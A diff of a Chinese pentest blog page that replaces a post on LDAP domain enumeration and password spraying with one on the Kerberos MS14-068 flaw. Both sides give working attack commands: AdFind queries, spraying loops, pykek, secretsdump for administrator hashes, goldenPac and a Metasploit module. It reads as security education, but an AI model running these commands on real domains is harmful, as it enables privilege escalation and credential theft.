@@ -14,11 +14,11 @@
     <script async defer src="https://buttons.github.io/buttons.js"></script>
     <title>
         
-          LDAP协议 - Kat | Blog
+          MS14-068 - Kat | Blog
         
     </title>
 
-    <link rel="canonical" href="https://spanning-tree.xyz/2021/043e4e3078.html">
+    <link rel="canonical" href="https://spanning-tree.xyz/2021/02892d8aa9.html">
 
     <!-- Bootstrap Core CSS -->
     <link rel="stylesheet" href="/css/bootstrap.min.css">
@@ -88,14 +88,14 @@
                     <div class="post-heading">
                         <div class="tags">
                             
-                              <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
+                              <a class="tag" href="/tags/#域渗透" title="域渗透">域渗透</a>
                             
                         </div>
-                        <h1>LDAP协议</h1>
+                        <h1>MS14-068</h1>
                         <h2 class="subheading"></h2>
                         <span class="meta">
                             Posted by Kat on
-                            2021-04-11
+                            2021-02-08
                         </span>
                     </div>
                 
@@ -215,62 +215,48 @@
                 col-md-10 col-md-offset-1
                 post-container">
 
-                <h1 id="ldap协议">LDAP协议</h1>
-<h2 id="1-什么是ldap协议">1. 什么是LDAP协议？</h2>
-<p>这个协议我个人理解的相对比较抽象比较不太好表达，首先协议本身就是规范一些规则。</p>
-<p>LDAP协议规定了Server与client之间通信的方式以及端口号、信息交互的格式等。</p>
-<p>而针对LDAP协议的实现具有不同版本，Active Diretory是LDAP协议在windows 上的实现；Open LDAP是LDAP协议在Linux上的实现。</p>
-<h2 id="2-ldap协议的基本模型">2. LDAP协议的基本模型</h2>
-<p>LDAP协议是以目录树的层次结构来存储数据，理解LDAP协议数据存储可以按照树形结构进行理解。</p>
-<p>LDAP协议的“根部”称作“基准DN”，行如：dc=icbc,dc=com,<a href="http://dc=cn%E6%88%96%E8%80%85o=icbc.com.cn" target="_blank" rel="noopener">dc=cn或者o=icbc.com.cn</a></p>
-<p>前一种方式相对较为灵活也是windows AD使用的一种方式。</p>
-<p>那么树形数据结构的发散也就是所说的“枝干”使用OU（Organization Unit）来进行表示，OU还有子OU。对应树形结构相当于分叉一样。</p>
-<p>OU可以表示内部的部门、分支机构、人员等等。</p>
-<p>LDAP中每一个记录都有一个唯一值来区别其他记录的名字DN（Distinguished Name），其实也就相当于传统数据库中key值。在树形结构“树叶”部分叫做RDN，RDN在OU中必须是唯一的。</p>
-<p>例：dn:cn=tom,ou=animals,dc=icbc,dc=com</p>
-<p>所以顺着树形数据结构的逻辑，我们访问一个数据所以先要知道是哪棵树，从根开始然后到枝干、分支、最后到树叶上。</p>
-<p>dn:cn=honglv,ou=bei,ou=xi,ou=dong,dc=icbc,dc=com</p>
-<p>LDAP协议中定义了一系统针对数据的访问操作，它包含三个部分：</p>
-<ul>
-<li>查询操作(Interrogation Operations)：允许查询目录和取得数据</li>
-<li>更新操作(Update Operations)：允许添加(ADD)、删除(Delete)、重命名(Rename)和改变目录(Modfiy)</li>
-<li>认证和管理操作(Authentication And Control Operations)：允许客户端在目录中识别自己，并且能够控制一个session的性质。</li>
-</ul>
-<h2 id="3-ldap与ad之间的关系">3. LDAP与AD之间的关系</h2>
-<p>正如前面所所Actice Dirctoty是LDAP在windwos 上的实现</p>
-<p>Actice Dirctoty是微软基于LDAP协议的一套解决方案，解决了细粒度的权限控制–“谁以什么权限访问什么”，AD在LDAP V3的基础上还增加了自定义扩展，如账号锁定、密码到期等。</p>
-<h2 id="4-利用ldap获取域信息">4. 利用LDAP获取域信息</h2>
-<p>默认情况下，任何一名认证用户都可以通过LDAP来获取大量有趣的域信息。因此，在信息收集阶段，我们可以利用LDAP查询、整理我们感兴趣的数据。</p>
-<p>针对windwos AD搜索工具有很多种：</p>
-<ul>
-<li>Adfind  可以在命令行下获取域的详细信息</li>
-<li>powerview  域渗透的一大神器，除了查询域信息外还有查询日志、获取DNS等功能。</li>
-<li>ADexplorer 是独立的可执行软件，除了查询域信息之外还可以拍摄快照后保存在本地，进行打开等操作。</li>
-<li>ldapsearch 是Unix中查询域信息的一款工具，kali中自带ldapserach</li>
-<li>LDAPDomainDump 是基于python环境收集域信息，并可以解析输出JSON、CSV/TSV格式</li>
-</ul>
-<h2 id="5-获取域信息实例">5. 获取域信息实例</h2>
-<p>以下针对Adfind使用进行介绍：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"> #</span>查询域内所有用户详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc u:*</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内特定用户详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc u:test</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内特定用户特定信息(mail)</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc u:test mail</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内所有用户dn信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc u:* -dn</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内用户数量</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc u:* -c</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内所有组详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc g:*</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内组名内包含“Admin”的所有组详细信息</span><br><span class="line"> adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc g:*Admin*</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内所有OU详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc o:* </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内所有计算机详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc c:* </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内所有站点详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc site:* </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内所有子网详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc subnet:*</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域的信任关系</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc trustdmp</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>查询域内spn的详细信息</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -sc spn:*</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span>搜索禁用的用户dn</span><br><span class="line">adfind -h 10.1.26.128 -u company\test -up Ms08067 -b DC=company,DC=com -f userAccountControl:AND:=514 -dn</span><br></pre></td></tr></table></figure>
-<h2 id="6-基于ldap协议爆破">6. 基于LDAP协议爆破</h2>
-<p>该工具使用的是LDAP协议对域中账户进行爆破：</p>
-<p><a href="https://github.com/dafthack/DomainPasswordSpray" target="_blank" rel="noopener">https://github.com/dafthack/DomainPasswordSpray</a></p>
-<p>原理：通过ADSI(ActiveDirectoryServicesInterface)（活动目录服务接口）尝试进行LDAP查询，获得结果</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainPasswordSpray -UserList .\users.txt -Password DomainUser123! -Verbose</span><br></pre></td></tr></table></figure>
-<p>输出结果如下图</p>
-<p><img src="https://tva1.sinaimg.cn/large/008eGmZEgy1gpg7yyzn8dj30zy06s3zb.jpg" alt="image-20210410172532275"></p>
-<p>DomainPasswordSpray支持筛选用户的功能，获得所有用户的列表，排除被禁用和被锁定的用户</p>
-<p>命令如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUserList -RemoveDisabled -RemovePotentialLockouts</span><br></pre></td></tr></table></figure>
-<p>域外进行暴力破解</p>
-<p>使用ldapsearch连接LDAP服务器的方法</p>
-<p>这里可以简单的加一个循环实现暴力破解，完整的bash命令如下：</p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in $(cat test.txt); do echo -e "\n$i";ldapsearch -x -H ldap://192.168.1.1:389 -D "CN="$i",CN=Users,DC=test,DC=com" -w DomainUser123! -b "DC=test,DC=com" |grep "# numEntrie";done</span><br></pre></td></tr></table></figure>
-<p>test.txt保存所有用户名，如果口令正确，输出查询结果的个数，如果口令错误，返回验证错误：<code>ldap_bind: Invalid credentials (49)</code></p>
-<p>域外使用Invoke-DomainPasswordSprayOutsideTheDomain暴力破解域用户口令</p>
-<p><a href="https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1" target="_blank" rel="noopener">https://github.com/3gstudent/Homework-of-Powershell/blob/master/Invoke-DomainPasswordSprayOutsideTheDomain.ps1</a></p>
-<p>​<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-DomainPasswordSprayOutsideTheDomain -Domain "192.168.1.1/DC=test,DC=com" -UserList .\user.txt -Password DomainUser123! -Verbose</span><br></pre></td></tr></table></figure></p>
-<p>参考链接：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E9%80%9A%E8%BF%87LDAP%E5%8D%8F%E8%AE%AE%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%9F%9F%E7%94%A8%E6%88%B7%E7%9A%84%E5%8F%A3%E4%BB%A4" target="_blank" rel="noopener">https://3gstudent.github.io/渗透基础-通过LDAP协议暴力破解域用户的口令</a></p>
+                <h1 id="ms14-068">MS14-068</h1>
+<h2 id="0x01-漏洞说明">0x01 漏洞说明</h2>
+<p>该漏洞允许普通域用户提权到域管理员身份。</p>
+<h3 id="1-影响系统">1. 影响系统</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows Server <span class="number">2003</span></span><br><span class="line">Windows Server <span class="number">2008</span> <span class="keyword">and</span> Windows Server <span class="number">2008</span> R2</span><br><span class="line">Windows Server <span class="number">2012</span> <span class="keyword">and</span> Windows Server <span class="number">2012</span> R2</span><br><span class="line">Windows Vista</span><br><span class="line">Windows <span class="number">7</span></span><br><span class="line">Windows <span class="number">8</span> <span class="keyword">and</span> Windows <span class="number">8.1</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x02-成因">0x02 成因</h2>
+<p>MS14-068漏洞的成因其实就是Kerberos协议的缺陷问题，借着MS14-068的漏洞回顾一下Kerberos的认证过程。</p>
+<ol>
+<li>用户向KDC发起AS-REQ请求，请求的凭据是用户使用自己的hash加密时间戳，KDC使用用户的hash进行解密。如果结果正确返回krbtgt hash加密的TGT票据，TGT票据中含有PAC，PAC中含有用户的sid、用户所在的组。（PAC的引入解决Kerberos认证过程中，我是谁、我可以做什么的问题）</li>
+<li>用户凭借TGT票据向TGS发起TGS-REQ请求，KDC使用krbtgt用户hash解密。如果正确KDC就使用服务的hash加密的TGS票据（这一步不管用户有没有服务的访问权限，都将返回TGS票据。这也是kerberoating漏洞的成因，只要拥有任意用户的hash均可获取任意服务的TGS票据。）</li>
+<li>用户拿着TGS票据去请求服务，服务使用自己的hash去解密TGS票据。如果正确，就拿着PAC去向KDC询问用户权限，域控解密PAC获取用户的sid，以及所在的组，在判断用户是否具有对应服务的访问权限。（有些服务并没有验证PAC的步骤，所以这是白银票据成功利用的前提条件。）</li>
+</ol>
+<p><em>TIPS：PAC对于用户和服务都是不可见的，只有KDC具有权限能够制作和查看PAC。</em></p>
+<h2 id="0x03-ms14-068-漏洞分析">0x03 MS14-068 漏洞分析</h2>
+<p>该漏洞的本质地方在于KDC无法校验PAC的有效签名。</p>
+<p>签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名。</p>
+<p>问题在于实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC 进行md5，就生成新的校验和。也就意味着用户可以自己构造一张PAC，构造完成之后再用md5 给他生成一个服务检验和以及KDC校验和。</p>
+<h3 id="0x04-漏洞利用">0x04 漏洞利用</h3>
+<p>前提：</p>
+<p>域用户账号密码、SID、域控地址</p>
+<p><strong>获取SID</strong></p>
+<p>360安全大脑会拦截此行为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 lookupsid.py hack.com/test:<span class="string">"111111"</span>@<span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1065370/1657810219152-c9efacd7-16ed-47db-a896-1fe968384625.png" alt="img"></p>
+<h4 id="pykek">pykek</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 ms14<span class="number">-068.</span>py -u test@hack.com -s S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-3748771105</span><span class="number">-1916670041</span><span class="number">-1145606913</span><span class="number">-1110</span> -d <span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1065370/1657810373772-09529377-52ac-419c-9613-3e3339385883.png" alt="img"></p>
+<p>导入票据，验证</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=TGT_test@hack.com.ccache</span><br><span class="line">python3 secretsdump.py hack.com/test@DC.hack.com -no-<span class="keyword">pass</span> -k -dc-ip <span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span> -just-dc-user administrator</span><br></pre></td></tr></table></figure>
+<p>在域外需要指定域内DNS，否者会报错</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1065370/1657810988825-19134a9c-bc70-486c-b246-73a42c865631.png" alt="img"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1065370/1657810918029-adc29c51-d559-4699-b2ea-0ba4480beb86.png" alt="img"></p>
+<h3 id="impacket">impacket</h3>
+<p>godenPac结合了psexec和ms14-068</p>
+<p>在开启SMB session的时候会杀软被拦截。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 goldenPac.py hack.com/test:<span class="string">"111111"</span>@DC.hack.com -dc-ip <span class="number">10.211</span><span class="number">.55</span><span class="number">.6</span> -debug</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1065370/1657811302595-77166192-e315-417a-a060-55de132085e9.png" alt="img"></p>
+<h3 id="msf">msf</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use /auxiliary/admin/kerberos/ms14068kerberos_checksum/</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/1065370/1657811776952-37fe5e31-08e6-4818-886d-804aaee67afc.png" alt="img"></p>
+<h4 id="reference">Reference</h4>
+<p>daiker@360RedTeam</p>
 
                 
 
@@ -279,12 +265,12 @@
                 <ul class="pager">
                     
                         <li class="previous">
-                            <a href="/2021/0466d81e0e.html" data-toggle="tooltip" data-placement="top" title="NTLM协议">&larr; Previous Post</a>
+                            <a href="/2021/043e4e3078.html" data-toggle="tooltip" data-placement="top" title="LDAP协议">&larr; Previous Post</a>
                         </li>
                     
                     
                         <li class="next">
-                            <a href="/2021/02892d8aa9.html" data-toggle="tooltip" data-placement="top" title="MS14-068">Next Post &rarr;</a>
+                            <a href="/2020/12eeb7b3d2.html" data-toggle="tooltip" data-placement="top" title="redis主从复制getshell">Next Post &rarr;</a>
                         </li>
                     
                 </ul>
@@ -340,7 +326,7 @@
         <div id="toc" class="toc-article">
         <strong class="toc-title">Contents</strong>
         
-          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#ldap协议"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">LDAP&#x534F;&#x8BAE;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#1-什么是ldap协议"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">1. &#x4EC0;&#x4E48;&#x662F;LDAP&#x534F;&#x8BAE;&#xFF1F;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#2-ldap协议的基本模型"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">2. LDAP&#x534F;&#x8BAE;&#x7684;&#x57FA;&#x672C;&#x6A21;&#x578B;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#3-ldap与ad之间的关系"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">3. LDAP&#x4E0E;AD&#x4E4B;&#x95F4;&#x7684;&#x5173;&#x7CFB;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#4-利用ldap获取域信息"><span class="toc-nav-number">1.4.</span> <span class="toc-nav-text">4. &#x5229;&#x7528;LDAP&#x83B7;&#x53D6;&#x57DF;&#x4FE1;&#x606F;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#5-获取域信息实例"><span class="toc-nav-number">1.5.</span> <span class="toc-nav-text">5. &#x83B7;&#x53D6;&#x57DF;&#x4FE1;&#x606F;&#x5B9E;&#x4F8B;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#6-基于ldap协议爆破"><span class="toc-nav-number">1.6.</span> <span class="toc-nav-text">6. &#x57FA;&#x4E8E;LDAP&#x534F;&#x8BAE;&#x7206;&#x7834;</span></a></li></ol></li></ol>
+          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#ms14-068"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">MS14-068</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x01-漏洞说明"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">0x01 &#x6F0F;&#x6D1E;&#x8BF4;&#x660E;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#1-影响系统"><span class="toc-nav-number">1.1.1.</span> <span class="toc-nav-text">1. &#x5F71;&#x54CD;&#x7CFB;&#x7EDF;</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x02-成因"><span class="toc-nav-number">1.2.</span> <span class="toc-nav-text">0x02 &#x6210;&#x56E0;</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#0x03-ms14-068-漏洞分析"><span class="toc-nav-number">1.3.</span> <span class="toc-nav-text">0x03 MS14-068 &#x6F0F;&#x6D1E;&#x5206;&#x6790;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#0x04-漏洞利用"><span class="toc-nav-number">1.3.1.</span> <span class="toc-nav-text">0x04 &#x6F0F;&#x6D1E;&#x5229;&#x7528;</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#pykek"><span class="toc-nav-number">1.3.1.1.</span> <span class="toc-nav-text">pykek</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#impacket"><span class="toc-nav-number">1.3.2.</span> <span class="toc-nav-text">impacket</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#msf"><span class="toc-nav-number">1.3.3.</span> <span class="toc-nav-text">msf</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#reference"><span class="toc-nav-number">1.3.3.1.</span> <span class="toc-nav-text">Reference</span></a></li></ol></li></ol></li></ol></li></ol>
         
         </div>
       </aside>
@@ -360,7 +346,7 @@
                     <h5><a href="/tags/">FEATURED TAGS</a></h5>
                     <div class="tags">
                        
-                          <a class="tag" href="/tags/#内网渗透" title="内网渗透">内网渗透</a>
+                          <a class="tag" href="/tags/#域渗透" title="域渗透">域渗透</a>
                         
                     </div>
                 </section>
